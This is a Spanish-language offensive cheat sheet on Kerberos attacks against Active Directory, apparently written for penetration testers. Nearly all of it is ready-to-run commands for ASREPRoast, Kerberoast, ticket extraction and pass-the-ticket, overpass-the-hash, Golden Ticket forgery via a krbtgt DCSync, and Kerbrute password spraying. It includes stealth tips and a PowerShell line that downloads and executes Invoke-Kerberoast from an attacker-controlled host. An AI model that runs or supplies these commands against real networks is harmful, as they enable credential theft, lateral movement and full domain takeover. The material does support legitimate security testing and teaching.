## Ataques Kerberos en Active Directory

Kerberos es el protocolo de autenticación principal en entornos Windows/AD. Funciona mediante tickets cifrados que permiten acceder a servicios sin reenviar contraseñas. Sus componentes clave son:

- **KDC (Key Distribution Center)** — servicio en el DC que emite tickets
- **TGT (Ticket Granting Ticket)** — ticket de autenticación general, cifrado con el hash de `krbtgt`
- **TGS (Ticket Granting Service)** — ticket de acceso a un servicio específico, cifrado con el hash de la cuenta de servicio

### Herramientas principales

| Herramienta | Plataforma | Uso principal |
| ----------- | ---------- | ------------- |
| `GetNPUsers.py` (Impacket) | Linux | ASREPRoast |
| `GetUserSPNs.py` (Impacket) | Linux | Kerberoast |
| `getTGT.py` (Impacket) | Linux | Obtener TGT |
| `ticketer.py` (Impacket) | Linux | Forjar tickets (Silver/Golden) |
| `ticketConverter.py` (Impacket) | Linux/Windows | Convertir .kirbi ↔ .ccache |
| Rubeus | Windows | Todo — Kerberoast, ASREPRoast, PtT, forja |
| Mimikatz | Windows | Extraer tickets, forjar Golden/Silver |
| Kerbrute | Linux/Windows | Enumeración y brute-force via Kerberos |

---

## Enumeración Kerberos

```shell
# Enumerar usuarios válidos sin credenciales (brute-force via Kerberos)
kerbrute userenum -d <dominio> --dc <ip_dc> users.txt

# Enumerar usuarios con spraying de contraseña
kerbrute passwordspray -d <dominio> --dc <ip_dc> users.txt '<contraseña>'

# Enumerar cuentas con preauth deshabilitada (ASREPRoastables)
kerbrute userenum -d <dominio> --dc <ip_dc> users.txt --downgrade

# Enumerar SPNs (cuentas Kerberoasteables)
GetUserSPNs.py '<dominio>/<usuario>:<contraseña>' -dc-ip <ip_dc>
```

---

## ASREPRoast

Cuando una cuenta tiene deshabilitada la preautenticación Kerberos (`Do not require Kerberos preauthentication`), cualquiera puede solicitar un AS-REP cifrado con la contraseña del usuario — sin necesidad de autenticarse previamente.

### Desde Linux (externamente — recomendado)

```shell
# Sin credenciales — solo con lista de usuarios
GetNPUsers.py '<dominio>/' -no-pass -usersfile users.txt -dc-ip <ip_dc> -format hashcat

# Con credenciales — enumera automáticamente las cuentas vulnerables
GetNPUsers.py '<dominio>/<usuario>:<contraseña>' -dc-ip <ip_dc> -request -format hashcat

# Con hash NT
GetNPUsers.py '<dominio>/<usuario>' -dc-ip <ip_dc> -hashes ':<hash_nt>' -request -format hashcat
```

### Desde Windows (internamente)

```powershell
# Con Rubeus — detecta y obtiene todos los hashes ASREPRoasteables
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Usuario específico
.\Rubeus.exe asreproast /user:<usuario> /format:hashcat /outfile:asrep_hashes.txt
```

### Crackear el hash offline

```shell
# Hashcat — modo 18200 para AS-REP
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

---

## Kerberoast

Cualquier usuario autenticado puede solicitar un TGS para cualquier SPN del dominio. El ticket está cifrado con el hash de la cuenta de servicio — si usa RC4 (NTLM) puede crackearse offline muy rápido.

### Desde Linux (externamente — recomendado)

```shell
# Listar SPNs disponibles
GetUserSPNs.py '<dominio>/<usuario>:<contraseña>' -dc-ip <ip_dc>

# Solicitar tickets y guardar hashes
GetUserSPNs.py '<dominio>/<usuario>:<contraseña>' -dc-ip <ip_dc> \
  -request -outputfile kerberoast_hashes.txt

# Forzar RC4 en el ticket (más fácil de crackear)
GetUserSPNs.py '<dominio>/<usuario>:<contraseña>' -dc-ip <ip_dc> \
  -request -outputfile kerberoast_hashes.txt -etype RC4

# Con hash NT
GetUserSPNs.py '<dominio>/<usuario>' -dc-ip <ip_dc> \
  -hashes ':<hash_nt>' -request -outputfile kerberoast_hashes.txt

# Sin preautenticación (si existe cuenta ASREPRoastable conocida)
GetUserSPNs.py -no-preauth <usuario_sin_preauth> \
  -usersfile spns.txt -dc-host <ip_dc> '<dominio>/'
```

### Desde Windows (internamente)

```powershell
# Con Rubeus
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Forzar RC4 en todos los tickets
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt

# Usuario específico
.\Rubeus.exe kerberoast /user:<usuario> /outfile:kerberoast_hashes.txt

# Con PowerView — Invoke-Kerberoast
IEX (new-object Net.WebClient).DownloadString('http://<ip_atacante>/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash | Out-File kerberoast_hashes.txt
```

### Crackear el hash offline

```shell
# Hashcat — modo 13100 para TGS-REP RC4
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# AES256 (modo 19700) — más lento
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

---

## Pass-the-Ticket (PtT)

Usar un ticket Kerberos robado o forjado para autenticarse sin conocer la contraseña.

### Extraer tickets existentes

```shell
# Desde Linux — listar tickets en el entorno
klist

# Desde Windows con Mimikatz
sekurlsa::tickets /export    # exporta todos los tickets a .kirbi
kerberos::list /export       # alternativa

# Desde Windows con Rubeus
.\Rubeus.exe dump             # vuelca tickets en base64
.\Rubeus.exe dump /service:krbtgt   # solo TGTs
```

### Convertir tickets entre formatos

```shell
# .kirbi (Windows) → .ccache (Linux)
ticketConverter.py ticket.kirbi ticket.ccache

# .ccache (Linux) → .kirbi (Windows)
ticketConverter.py ticket.ccache ticket.kirbi

# Convertir base64 de Rubeus a archivo
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<base64_ticket>"))
```

### Usar el ticket

```shell
# Desde Linux
export KRB5CCNAME=$(pwd)/ticket.ccache
psexec.py -k -no-pass '<dominio>/<usuario>'@<objetivo>.<dominio>
wmiexec.py -k -no-pass '<dominio>/<usuario>'@<objetivo>.<dominio>
smbclient //<objetivo>.<dominio>/C$ -k -no-pass

# Desde Windows — inyectar con Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Desde Windows — inyectar con Mimikatz
kerberos::ptt ticket.kirbi

# Verificar ticket inyectado
klist
```

---

## Over-Pass-the-Hash (Pass-the-Key)

Usar el hash NT o la clave AES de un usuario para solicitar un TGT legítimo al KDC — convirtiendo el hash en un ticket Kerberos usable.

### Desde Linux

```shell
# Con hash NT
getTGT.py '<dominio>/<usuario>' -hashes ':<hash_nt>' -dc-ip <ip_dc>

# Con clave AES256 (más sigiloso — Pass-the-Key)
getTGT.py '<dominio>/<usuario>' -aesKey <clave_aes256> -dc-ip <ip_dc>

export KRB5CCNAME=<usuario>.ccache
psexec.py -k -no-pass '<dominio>/<usuario>'@<objetivo>.<dominio>
```

### Desde Windows

```powershell
# Con Rubeus — solicita TGT e inyecta directamente
.\Rubeus.exe asktgt /domain:<dominio> /user:<usuario> /rc4:<hash_nt> /ptt

# Con AES256 (Pass-the-Key — más sigiloso)
.\Rubeus.exe asktgt /domain:<dominio> /user:<usuario> /aes256:<clave_aes256> /ptt

# Con Mimikatz
sekurlsa::pth /user:<usuario> /domain:<dominio> /ntlm:<hash_nt> /run:cmd.exe
```

---

## Golden Ticket

Forjar un TGT arbitrario usando el hash NT de la cuenta `krbtgt`. Otorga acceso total y persistente a todos los recursos del dominio — incluso si se cambian contraseñas de administrador.

### Prerrequisitos

- Hash NT de la cuenta `krbtgt`
- SID del dominio

```shell
# Obtener el hash de krbtgt via DCSync
secretsdump.py '<dominio>/<usuario>:<contraseña>'@<ip_dc> -just-dc-user krbtgt
```

### Desde Linux

```shell
ticketer.py -nthash <hash_nt_krbtgt> \
  -domain-sid <sid_dominio> \
  -domain <dominio> \
  administrator

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass '<dominio>/administrator'@<dc>.<dominio>
secretsdump.py -k -no-pass '<dominio>/administrator'@<dc>.<dominio>
```

### Desde Windows

```powershell
# Con Mimikatz — forjar e inyectar
kerberos::golden /domain:<dominio> /sid:<sid_dominio> \
  /rc4:<hash_nt_krbtgt> /user:administrator /ptt

# Con AES256 (más sigiloso)
kerberos::golden /domain:<dominio> /sid:<sid_dominio> \
  /aes256:<clave_aes256_krbtgt> /user:administrator /ptt

# Con Rubeus
.\Rubeus.exe golden /rc4:<hash_nt_krbtgt> /sid:<sid_dominio> \
  /domain:<dominio> /user:administrator /ptt
```

---

## Brute-Force y Password Spraying via Kerberos

```shell
# Enumerar usuarios válidos (sin bloqueo de cuentas)
kerbrute userenum -d <dominio> --dc <ip_dc> users.txt -o valid_users.txt

# Password spraying — UNA contraseña contra muchos usuarios
kerbrute passwordspray -d <dominio> --dc <ip_dc> valid_users.txt 'Password123!'

# Brute-force sobre un usuario específico (cuidado con bloqueos)
kerbrute bruteuser -d <dominio> --dc <ip_dc> passwords.txt <usuario>
```

> ⚠️ El spraying via Kerberos tiene la ventaja de que el error `KDC_ERR_PREAUTH_FAILED` no incrementa el contador de bloqueo en muchas configuraciones — pero verificar siempre la política antes de lanzarlo.

---

## Resumen de ataques

| Ataque | Prerrequisito | Hash obtenido | Modo hashcat |
| ------ | ------------- | ------------- | ------------ |
| ASREPRoast | Cuenta sin preauth | AS-REP (krbasrep5) | 18200 |
| Kerberoast | Credenciales de dominio | TGS-REP (RC4) | 13100 |
| Kerberoast | Credenciales de dominio | TGS-REP (AES256) | 19700 |
| Golden Ticket | Hash NT de `krbtgt` | TGT forjado | — |
| Silver Ticket | Hash NT de cuenta de servicio | TGS forjado | — |
| Over-PtH | Hash NT de usuario | TGT legítimo | — |
| Pass-the-Ticket | Ticket robado o forjado | — | — |

---

### Referencias

- https://www.thehacker.recipes/ad/movement/kerberos/
- https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/
- https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
- https://github.com/GhostPack/Rubeus
- https://www.tarlogic.com/blog/how-to-attack-kerberos/
